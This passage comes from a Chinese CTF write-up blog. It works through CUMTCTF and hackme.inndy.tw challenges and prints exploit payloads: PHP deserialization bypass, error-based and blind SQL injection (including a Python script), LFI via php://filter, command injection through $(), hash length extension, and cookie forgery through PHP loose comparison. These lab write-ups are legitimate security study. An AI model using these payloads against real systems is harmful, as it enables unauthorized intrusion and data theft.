__destruct()\n    {\n        var_dump($this->file);\n        var_dump(file_exists($this->file));\n        // TODO: Implement __destruct() method.\n        if (!strpos($this->file,'/')&&!strpos($this->file,'\\\\')){\n            highlight_file($this->file);\n        }else\n        die('你想干嘛');\n    }\n}\n```\n\n题目需要绕过需要\\_\\_wakeup()函数，百度发现该处存在一个CVE漏洞 [Click Here](https://blog.csdn.net/qq_19876131/article/details/52890854)\n\n我们写php代码序列化\n\n```php\nclass Admin{\n    public $file = 'flag.php';\n}\n$obj = new Admin();\necho serialize($obj);\n```\n\n题目返回 `O:5:\"Admin\":1:{s:4:\"file\";s:8:\"flag.php\";}` ，我们只需要把Admin后面的1修改为2然后在url编码即可，最终payload\n\n```\nO%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D\n```\n\n## phpmywind\n\n首先得到flag非常简单，题目好像出bug了，访问首页直接就可以得到flag：）\n\n![payload](cumtctf/7.png)\n\n但是题目好像修复了(事实上题目本身没有任何问题，之所以可看到flag是因为已经有大佬做出来了)，所以我们还是要来一波正解\n\n题目给出来cms和版本，直接百度搜索漏洞，发现有个前台sql注入漏洞，需要先注册一个合法用户，我注册了一个用户为test_snow，密码123456，登录，然后在该网址下提交如下内容(因为该题目没有回显，所以使用了报错注入)\n\n![](cumtctf/11.png)\n\n于是就可以看到数据库名，说明该报错方法可用，\n\n![](cumtctf/12.png)\n\n但是该语句无法使用select语句，网上查找到了另一种报错注入的方法\n\n```\nselect count(*),concat(char(@`%27`),(select schema_name from information_schema.schemata limit 1,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x\n```\n\n可以利用这种方法报库名，发现这个库名为 `phpmyflag` ，虽然不是当前库，但是flag应该就是在这个库中\n\n爆表名\n\n```\nselect count(*),concat(char(@`%27`),(select table_name from information_schema.tables where table_schema=0x7068706d79666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x\n```\n\n本题中如果没有报错的话就会显示账号完善成功，这里只需要再次登录一下就可以了，由于题目转义过滤了单引号，所以使用了十六进制绕过\n\n爆列名\n\n```\nselect count(*),concat(char(@`%27`),(select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x\n```\n\n读flag\n\n```\nselect count(*),concat(char(@`%27`),(select flag from phpmyflag.flag limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x\n```\n\n![result](cumtctf/14.png)\n\n之前我以为flag在当前数据库中，走了不少弯路，看来还是自己思维太局限了\n\n[参考链接](https://www.0dayhack.com/post-764.html)\n\n<!--flag{327A6C4304AD5938EAF0EFB6CC3E53DC}-->\n\n# BASIC\n\n## decode\n\nhex打开再base64解码即可\n\n## 白驹过隙\n\n访问题目出现\n\n> You Have Missed the Flag ~>.<~\n\n开始猜测可能是某次返回的正确的flag，于是一连访问了1000次还是一无所获，后面想到它说 “You **Missed** flag”，所以思路应该是发生了302跳转，抓包也没有发现什么异常，没找到时哪儿发生了302跳转，后面一个偶然的机会，我们在原来题目链接出查看一下链接\n\n![](cumtctf/8.png)\n\n再看题目页面的链接 *{% raw %}http://202.119.201.199/challenge/basic/http/defauIt.php {% endraw %}* 仔细看一下，会发现两个 `default.php` 中题目给的链接中default倒数第二位是小写的L，而到了题目中变成了大写的 i ！！，如此的话跳转就清楚了，可以访问default.php(l为小写的L)\n\n![](cumtctf/9.png)\n\n可以看到确实发生了302跳转，抓包\n\n![](cumtctf/10.png)\n\n可以看到此处跳转到了defauIt.php(大写的i)，也可以看到我们读到了flag\n\n或者你也可以直接挑战页面点击题目链接抓包，也可以读到flag，原理是一样的\n\n<!-- flag{U_a4e_A_Car3fu1_b0y} -->\n\n## 齐白石\n\n16进制编辑器查看一下即可在字符串末尾看到flag\n\n<!-- flag{so_bor1ing_eMeMEMEMEM} -->\n\n## encode\n\n题目给出的是jsfuck代码，直接找在线网站运行一下借口得到flag\n\n<!-- flag{jj_3Nc0d3_i5_fun} -->\n\n## DNS解析\n\n直接修改本地hosts文件解开，linux下修改/etc/hosts文件，添加一行数据\n\n```\n202.119.201.199 welcome.bxsteam.xyz\n```\n\n然后访问welcome.bxsteam.xyz即可得到flag\n\n<!-- flag{H3110_w0rld} -->\n\n## 签到1\n\n邮件查看源代码，base64解码一下即可得到flag\n\n<!-- flag{this_is_so_easy_is_it?} -->\n\n## 签到2\n\n按照题目要去F12转到控制台在点击网络选项卡，选择重新载入，之后再消息头中的flag字段即可看到flag\n\n<!-- flag{Linux-Centos} -->\n\n## 超简单的密码\n\n键盘加密，低头看下键盘即可，网上也有在线解密网站\n\n<!-- flag{isee} -->\n\n## \t滑稽\n\nppt伪加密，打开后提示需要输入密码，网上找到一种方法可以绕过\n\n> 破解pptx只读需要密码\n>重命名qzxdh.pptx为qzxdh.zip，解压到**当前文件夹**后，切换到\\ppt之下，用记事本开启presentation.xml文件；\n>把<p:modifyVerifier ... />整块选中并删除，保存并关闭；\n>将文件再打包成qzxdh.zip，更名为pptx即可。\n>本文来自 qzxdh 的CSDN 博客 ，全文地址请点击：https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy \n\n按照该方法即可打开PPT，之后拖动首页幻灯片后即可发现后面还藏着一张幻灯片，里面就有flag\n\n<!-- flag{hua_tian_xia_zhi_da_ji} -->\n\n## Fast 30\n\n一道很常规的题目，就是不断把题目返回的信息在两秒之内发回去，这肯定不能人工操作，需要编程，本题需要提交的内容是header头里面的Flag字段的值，代码如下\n\n```python\nimport requests\n\nurl = \"http://web.bxsteam.xyz/fast/\"\nheader = requests.get(url).headers[\"Flag\"]\nwhile True:\n\theader = requests.post(url,data={\"key\":header}).headers['Flag']\n\tans = requests.post(url,data={\"key\":header}).text\n\tif '{' in ans:\n\t\tbreak\n```\n\n<!-- cumtctf{time_1s_a_Resource} -->\n\n# MISC\n\n## LSB\n\n题目给出了提示，lsb色道隐写，丢进steg里面看一下，发现rgb的每个0通道里面，图片上方都有会多出一个黑块，说明和这三个色道有关系\n\n![](cumtctf/19.png)\n\n提取一下这三个色道的信息，发现时png文件头\n\n![](cumtctf/20.png)\n\n提取保存为png图片是个二维码，直接扫码就可以看到flag\n\n<!-- cumtctf{1sb_i4_s0_Ea4y} -->\n\n## 爱因斯坦\n\n右键查看图片属性，发现在备注里面有一串字符 `this_is_not_password`，感觉这应该是压缩包密码，猜测图片中应该隐含了一个压缩包，hed软件打开图片，直接搜索 `504b0304` (zip文件头)，果然找到了，而且在右边的字符串中还看到了flag.txt字样，直接将这段提取出来，改后缀为zip，解压，提示需要密码，输入前面的字符串 `this_is_not_password` ，解压即可得到flag\n\n<!-- flag{dd22a92bf2cceb6c0cd0d6b83ff51606} -->\n\n## 视而不见\n\n看了好久没思路，网上发现bmp图像的题目基本都是色道隐写的问题，于是就用stegsolve软件疯狂尝试，analyse->steteogram->solver里面修改偏移值找到了flag(233333)\n\n![result](cumtctf/21.png)\n\n## 鲨鱼的套路\n\n打开数据包，追踪tcp流，发现如下内容\n\n```\nhello\nhehe\ni will give you flag~\no\nbut you must tell me te.he anhhao...ao~\nwoyaohuinongcun\nok i will give you flag~\njust revice .......g.receive it\nUEsDBBQAAAgIANeFfErNFL6kGwAAABsAAAAcAAAAaGludF9zb21lIF90aGluZ19pc19mYWtlLnR4dEvLSUyvTs5IzUuPL87IjC9JzI/PKQUyU/NqAVBLAQI/ABQACQAIANeFfErNFL6kGwAAABsAAAAcACQAAAAAAAAAIAAAAAAAAABoaW50X3NvbWUgX3RoaW5nX2lzX2Zha2UudHh0CgAgAAAAAAABABgAu7Ux1J+n0gGhDeAnl6fSAaEN4CeXp9IBUEsFBgAAAAABAAEAbgAAAFUAAAAAAA==\n~\nbye~\no \n```\n\n这段应该是base64，但是在线网站无法解码，自己尝试，发现是个压缩包，保存为zip格式\n\n![](cumtctf/22.png)\n\n之后是zip伪加密\n\n![](cumtctf/23.png)\n\n<!-- flag{cheng_shi_tao_lu_shen} -->\n\n## easy crypto\n\n解压之后有个morse.txt，一看就是摩斯密码，解码为 `keyisvigenerecipher` ，提到了维吉尼亚密码，直接解密flag.txt，key就是 `vigenerecipher` ，然后解码即可得到flag\n\n<!-- flag{vigenereencryptionhhh} -->\n\n## code\n\n题目给出了代码\n\n```\nchar getCode(char orgin) {\n    return ( key1 * (orgin-97) + key2 ) % 26 + 97;\n}\ncode : joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm\n```\n\n注意题目的路径其实给出了提示 `challenge/misc/fangshe/` ，最后的 *fangshe* 其实就是仿射的意思，意思是本题是一道放射密码的题目，就是位置为key1和key2的仿射加密，网上说了key1，key2的范围是小于26的，我们数论刚开始学，我也不是很理解，我个人感觉应该是由于题目的函数如果把key1和key2看做x和y的话，key1 * (orgin-97) + key2就是一条直线，那么key值大于26之后模26是会和前面重复的，这个以后学了得在研究一下，但是这题我们可尝试暴力破解，需要注意的是我之前以为题目给的code是密文，但事实上人家给的是明文，密文是flag .......\n\n```python\ncipher = \"joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm\"\nans = \"\"\nfor key1 in range(0,26):\n  for key2 in range(0,26):\n    ans = \"\"\n    for char in cipher:\n      ans += chr((key1 * (ord(char)-97) + key2) % 26 + 97)\n    if \"flag\" in ans or \"ctf\" in ans:\n      print(ans)\n```\n\n跑完之后发现其中一个结果是\n\n> heiboyflagisffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa\n\n断句一下为\n\n> hei boy,flag is ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa\n\n<!-- flag{ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa} -->\n\n## PS Master\n\n题目提示的很明显了，和ps有关，那基本就是图层的问题了，但是题目的文件用PS无法打开，binwalk一下发现是个gif图片，修改文件后缀为gif，发现可以用PS打开，打开之后第二个图层是个二维码，但是无法扫描，因为定位块上都有个二哈\n\n![PS提取结果](cumtctf/35.png)\n\n参照标准二维码可以知道，左上，右上，左下都应该是黑色的定位块，可以用win10自带的画图工具把右上的块复制到左上和左下，然后把二哈图案用黑色填充，处理之后如下，扫码可得flag\n\n![result](cumtctf/36.png)\n\n<!-- flag{hi_doge_i_am_er_ha} -->\n\n## 传感器1\n\n题目提示了是第九届全国大学生信息安全竞赛，可以知道这个题目考察的是曼彻斯特编码，先将题目的16进制转为2进制，根据曼彻斯特编码规则，由低到高即01代表1，由高到低即10代表0，之后转化为16进制之后发现与题目ID不符，还需要每八位进行一下反转，代码如下\n\n```python\ndef Manchester(s):\n    ans = ''\n    for i in range(len(s)//2):\n        if s[i*2:i*2+2] == '01':\n            ans += '1';\n        elif s[i*2:i*2+2] == '10':\n            ans += '0';\n        else:\n            print(\"error in\",i)\n            break\n    return ans\ns = \"010101010101010101010101010101011001010101010101010110100110010101010101011010101010011010010110101010100110011001100110011001100110100101010101\"\np = Manchester(s)\nflag = \"\"\nfor i in range(len(p)//8):\n    flag += p[i*8:i*8+8][::-1]\nprint(hex(int(flag,2)))\n```\n\n<!-- flag{FFFFFED31F645055F9} -->\n\n## 我就想试试这个名字到底能够起多长\n\n下载之后丢进stegsolve里面看一下，看一下低色道，发现是504b0304(zip文件头)\n\n![data extract](cumtctf/18.png)\n\n保存为zip格式，但是解压不了，WinRAR修复一下就可以解压了，将解压后的文件拖进hex里面看一下直接就看到了flag。\n\n<!-- hctf{dd0gf4c3tok3yb0ard4g41n~~~} -->\n\n## 你的石锅拌饭\n\n题目给出了提示信息，***培根***，可知是培根加密，而且题目字体用了两种字体，就更加确定了，网上查资料发现培根密码有两种加密方式\n\n>  第一种方式：\n    A aaaaa B aaaab C aaaba D aaabb E aabaa \n    F aabab G aabba H aabbb I abaaa J abaab\n    K ababa L ababb M abbaa N abbab O abbba \n    P abbbb Q baaaa R baaab S baaba T baabb\n    U babaa V babab W babba X babbb Y bbaaa \n    Z bbaab\n\n>    第二种方式\n    a AAAAA   g AABBA    n ABBAA   t BAABA\n    b AAAAB   h AABBB    o ABBAB   u-v BAABB\n    c AAABA   i-j ABAAA  p ABBBA   w BABAA\n    d AAABB   k ABAAB    q ABBBB   x BABAB\n    e AABAA   l ABABA    r BAAAA   y BABBA\n    f AABAB   m ABABB    s BAAAB   z BABBB\n\n而本题目中说了要大写，所以使用的是第一种加密方式，把题目中正常字体写成A，斜体写成B，转换之后如下\n\n```\nABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB\n```\n\n对照解密即可，也可以在在线网站解密\n\n## shark\n\n题目提示了用wireshark，是一道流量分析题目，打开之后随便浏览发现了ftp登录的信息\n\n![登录认证报文](cumtctf/24.png)\n\n感觉题目应该是和ftp有关，过滤一下ftp协议\n\n![](cumtctf/25.png)\n\n这就基本确定了本题就是获取这个flag.zip，直接 `tcp contains \"flag\"` ，可以看到FTP-DATA协议中传输了flag.zip的数据\n\n![](cumtctf/26.png)\n\n追踪tcp流，然后可以看到文件头为504b0304，可以确定这就是我们要的flag.zip文件，但是不能直接保存，这样是打不开的，要按照原始数据保存\n\n![save as为flag.zip](cumtctf/27.png)\n\n文件被加密了(不是伪加密)，需要密码，尝试前面登录ftp服务器的密码试一下，直接OK\n\n解压后的图片没有显示格式，丢进16进制编辑器里面看一下，是个png图片，但是文件头不对，修复一下\n\n![](cumtctf/28.png)\n\n然后保存为png图片打开就OK了\n\n![We are family!](cumtctf/29.png)\n\n<!-- flag{this_PIcTur3_1s_SO_ugly_} -->\n\n## 学姐真美\n\n下载之后是一张jpg图片，发现在图片尾部之后还有东西，感觉像是png图片相关的东西，因为有IHDR块，然后在下载一张png图片对着格式修复，本图只需要修复八位即可\n\n![repair](cumtctf/16.png)\n\n是一张二维码，但是只有一小部分，尝试修改图片尺寸，下图中前四个字节是宽度，后四个字节是高度，直接按我的修改为正方形即可\n\n![repair](cumtctf/17.png)\n\n<!-- flag{ChaoRan_is_beautiful!!!} -->\n\n## md5\n\n哈希长度扩展攻击，和web里面的 *is hash safe?* 相同类型，所以原理就不多说了，直接上工具\n\n```\nroot@kali:~# hashpump\nInput Signature: 4dbe35eaea655b0a2b0d06391175b8a3\nInput Data: r\nInput Key Length: 18\nInput Data to Add: snow\n```\n\n得到结果\n\n```\n65710003c2ff40389b064d3a020487bd\nr\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00snow\n```\n\n第一行md5提交，第二行在前面加上 **cy** 在将 `\\x` 换成空格，字母换成16进制表示即可，最终为\n\n```\n63 79 72 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 00 00 00 00 00 00 00 73 6E 6F 77\n```\n\n提交即可得到flag\n\n\n\n## 大家来找茬\n\n既然说了大家来找茬，感觉图片肯定有问题，估计是两张，binwalk一下发现果然是两个，foremost分离一下，本来以为是盲水印但是发现不是，百度发现了一个compare命令，试了一下居然得到个二维码，扫码得到flag\n\n```\ncompare 00000000.png 00000668.png 3.png\n```\n\n![](cumtctf/32.png)\n\n## 据说是个签到题\n\n流量分析，打开之后先过滤一下http包，只有两个http，发现其中一个请求为 `GET /evaltest/something/welcome/web/upload_function/upload/c2hlbGw=.php HTTP/1.1\\r\\n` ，感觉应该上传了什么东西，于是过滤tcp包 `tcp contains \"upload\"` 发现了数据传输，从第二个开始追踪tcp流\n\n![](cumtctf/15.png)\n\n发现了flag，但是经过了function.py的加密，不过题目也给出了代码，所以直接用它的代码解密一下即可，但是要把密文base64解密一下，代码如下\n\n```python\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\n\nimport sys\nimport base64\n\ndef decrypt(encrypted, passphrase):\n  IV = encrypted[:16]\n  aes = AES.new(passphrase, AES.MODE_CBC, IV)\n  return aes.decrypt(encrypted[16:])\n\ndef encrypt(message, passphrase):\n  IV = message[:16]\n  length = 16\n  count = len(message)\n  padding = length - (count % length)\n  message = message + \"\\0\" * padding\n  aes = AES.new(passphrase, AES.MODE_CBC, IV)\n  return aes.encrypt(message)\nIV = 'YUFHJKVWEASDGQDH'\na = \"mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==\"\nb = base64.b64decode(a)\nprint decrypt(b,\"Qq4wdrhhyEWe4qBF\")\n```\n\n## 萌萌哒\n\n颜文字密码(aaencode)，在线解码一下\n\n> alert(\"3Nc0d3.txt\")\n\n访问一下这个txt文件，发现是brainfuck编码，之后再OOK!解码一下可以得到flag\n\n<!-- flag{My_Br@iN_is_B00m_@_@} -->\n\n## 魂斗罗\n\n下载下来是个nes文件，要用fc模拟器打开，是个魂斗罗游戏，通关就可以得到flag，下载一个virtualnes软件即可运行，再用金手指输入一些秘籍来帮助我们通关，我只用了一个无限命的秘籍，其实用金身比较好，秘籍代码如下\n\n![](cumtctf/30.png)\n\n然后开启1p模式通过即可，一共好像是8关\n\n![](cumtctf/31.png)\n\n注意flag里面的字符是5不是s！\n\n<!-- hctf{ju5tf0rfun} -->\n\n## 传感器2\n\n前面一道题目的加强版， 按照之前题目的步骤求一下ID值\n\n```\n45psi: fffffed31f635055f8\n30psi: fffffed31f425055d7\n```\n\n可以看出有两处不同，分别是63==42，f8==d7，看了大佬的wp后得到前面的两位是与psi有关，最后两位是校验值，校验值是从ID开始的每两位相加的和模256，例如对于第一个 fe+d3+1f+63+50+55=2f8=>2f8%256=f8(注意是十六进制数)。前面的与psi对应的值可以按照比例计算即psi值为30时计算方式为\n\n```python\n# py3\na = (int('63',16)-int('42',16))/15 * 5\nb = int('42',16) - int(a)\nprint(hex(b))\n# @ans=0x37\n```\n\n补上ID之后求校验码\n\n```python\na = \"feb757375055\"\nsum = 0;\nfor i in range(len(a)//2):\n    sum += int(a[i*2:i*2+2],16)\nprint(hex(sum%256))\n# @ans=0xe8\n```\n\n那么最终的明文为 `FFFFFEB757375055E8`\n\n<!-- flag{FFFFFEB757375055E8} -->\n\n## 猜猜看\n\n题目说了是一个j开头的隐写工具，Google发现了下是jphs，下载了这个软件，可以在dos下运行\n\n```\njpseek.exe guess_flag.jpg flag.txt\n```\n\n\n提取需要密码，猜测了几次发现密码为flag，在flag.txt文件中发下了二进制文本，转为16进制看一下\n\n```python\ns = \"\" # 此处应为flag.txt中的二进制串\nhex_s = \"\"\nfor i in range(len(s)//8):\n    hex_s += hex(int(s[i*8:i*8+8],2))[2:4]\nprint(hex_s)\n```\n\n在线解码为字符串\n\n```\n<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1/ZOUGIgHlqN2eqtoYljfQfuGiQ/Pr9+/cv4P/5609/APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7/7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux/l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ/u5oyT08mD/YPL/XuTP/EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA/kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI/MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z/hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y/22wk7PaJTfqPv1E/bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4/ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k/tql2wX3e/pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH/3HxZ95/r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv/MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t/4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT/P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm/SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC/Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ/emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl/t03t4J9/rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq//mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB/kO2U9cL2tFgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk/8r9/TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg==\"></img>\n```\n\n一看就是个base64编码的图片，解码一下是个二维码，扫码即可得到flag\n\n![answer](cumtctf/33.png)\n\n这题还发现个stegdetect工具，收获挺大。\n\n<!-- flag{owid0-o91hf-9iahg} -->\n\n# REVERSE\n\n## Gift\n\n题目要让使用jeb，但是没找到工具，所以使用了kali下面的apktools，直接运行命令进行反编译\n\n```bash\napktool d Gift.apk\n```\n\n在Gift/smali/com/example/gift/flag.smail文件夹下面即可看到flag。\n\n","tags":["CTF"],"categories":["writeup"]},{"title":"hackme-web题解","url":"/2018/08/28/hackme/","content":"\n# 前言\n\n最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址[https://hackme.inndy.tw/](https://hackme.inndy.tw/)\n\n<!--more-->\n\n# LFI\n\n查看源代码\n\n![](hackme/1.png)\n\n尝试读取\n\n```\nhttps://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag\n```\n\n> Can you read the flag<?php require('config.php'); ?>?\n\n读取config即可得到flag\n\n```\nhttps://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config\n```\n\n# homepage\n\n查看代码在结尾看到一个`cute.js`，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可\n\n# ping\n\n命令执行，我们可以使用 `$()` 或者 <code>` `</code> 都可以实现执行命令的作用\n\n```bash\nhttps://hackme.inndy.tw/ping/?ip=$(ls -a)\n```\n\n然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试\n\n```bash\nhttps://hackme.inndy.tw/ping/?ip=$(tac *.*)\n```\n\n# scoreboard\n\nf12查看点击网络，查看一下消息头即可看到flag\n\n# login as admin 0\n\n题目主要源码如下\n\n```php\n<?php\nrequire('config.php');\n// table schema\n// user -> id, user, password, is_admin\nif($_GET['show_source'] === '1') {\n    highlight_file(__FILE__);\n    exit;\n}\nfunction safe_filter($str)\n{\n    $strl = strtolower($str);\n    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||\n        strstr($strl, 'update') || strstr($strl, 'delete')\n    ) {\n        return '';\n    }\n    return str_replace(\"'\", \"\\\\'\", $str);\n}\n$_POST = array_map(safe_filter, $_POST);\n$user = null;\n// connect to database\nif(!empty($_POST['name']) && !empty($_POST['password'])) {\n    $connection_string = sprintf('mysql:host=%s;dbname=%s;charset=utf8mb4', DB_HOST, DB_NAME);\n    $db = new PDO($connection_string, DB_USER, DB_PASS);\n    $sql = sprintf(\"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'\",\n        $_POST['name'],\n        $_POST['password']\n    );\n    try {\n        $query = $db->query($sql);\n        if($query) {\n            $user = $query->fetchObject();\n        } else {\n            $user = false;\n        }\n    } catch(Exception $e) {\n        $user = false;\n    }\n}\n?>\n```\n\n本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下\n\n```php\nfunction safe_filter($str)\n{\n    $strl = strtolower($str);\n    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||\n        strstr($strl, 'update') || strstr($strl, 'delete')\n    ) {\n        return '';\n    }\n    return str_replace(\"'\", \"\\\\\\\\'\", $str);\n}\n$_\n```\n\n可以看到，题目过滤了 `or 1=1` 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下\n\n```\nname=guest\\' or user=0x61646d696e-- +&password=guest\n```\n\n# login as admin 0.1 \n\n上个题目的加强版，直接union注入即可，最终payload如下\n\n```\nname=guest\\'  union select 1,the_f14g,3,3 from h1dden_f14g-- +&password=123465\n```\n\n# login as admin 1\n\n题目过滤并不严格，payload如下\n\n```\nadmin\\'/**/or/**/1/**/limit/**/0,1#\n```\n\n# login as admin 1.2\n\n上一题的加强版，需要进行盲注，代码如下\n\n```python\nimport requests\n\nurl = \"https://hackme.inndy.tw/login1/index.php\"\nlength = 1\nflag = \"\"\n\n# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),{},1))={})#\"\n# database:login_as_admin1\n# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),{},1))={})#\"\n# tables: 0bdb54c98123f5526ccaed982d2006a9,users\n# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),{},1))={})#\"\n# id,4a391a11cfa831ca740cf8d00782f3a6\n\npayload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),{},1))={})#\"\t\ndata = {'name':r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),{},1))>{})#\", 'password':\"123\"}\nfor i in range(0,70):\n\tfor j in range(32,128):\n\t\tdata['name'] = payload1.format(str(length),str(j))\n\t\tcontent = requests.post(url,data=data).text\n\t\tif \"FLAG\" in content:\n\t\t\tflag += chr(j)\n\t\t\tprint('**flag:**',flag)\n\t\t\tlength += 1\n\t\t\tbreak\n```\n\n# login as admin 3 \t\n\n题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 `!=` ，这就存在弱比较的漏洞\n\n```php\nfunction load_user()\n{\n    global $secret, $error;\n    if(empty($_COOKIE['user'])) {\n        return null;\n    }\n    $unserialized = json_decode(base64_decode($_COOKIE['user']), true);\n    $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig'];\n    if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) {\n        $error = 'Invalid session';\n        return false;\n    }\n    $data = json_decode($unserialized['data'], true);\n    return [\n        'name' => $data[0],\n        'admin' => $data[1]\n    ];\n}\n```\n\n我们只要使$unserialized['sig']的值为数字0即可绕过验证\n\n那么我们构造一个cookie\n\n```php\n<?php \nfunction set_user()\n{\n    global $user, $secret;\n    $user = ['admin', true];\n    $data = json_encode($user);\n    $sig = 0;\n    $all = base64_encode(json_encode(['sig' => $sig, 'data' => $data]));\n    return $all;\n}\necho set_user();\n?>\n```\n\n然后刷新即可\n\n# login as admin 4\n\n题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可\n\n```bash\ncurl -d \"name=admin\" https://hackme.inndy.tw/login4/\n```\n\n# Login as Admin 6\n\n```php\nif(!empty($_POST['data'])) {\n    try {\n        $data = json_decode($_POST['data'], true);\n    } catch (Exception $e) {\n        $data = [];\n    }\n    extract($data);\n    if($users[$username] && strcmp($users[$username], $password) == 0) {\n        $user = $username;\n    }\n}\n```\n\n看代码可知存在变量覆盖漏洞，构造json数据即可\n\n```php\ndata={\"users\":{\"admin\":\"snow\"},\"username\":\"admin\",\"password\":\"snow\"}\n```\n\n# login as admin 7\n\nmd5弱比较\n\n![payload](hackme/2.png)\n\n# login as admin 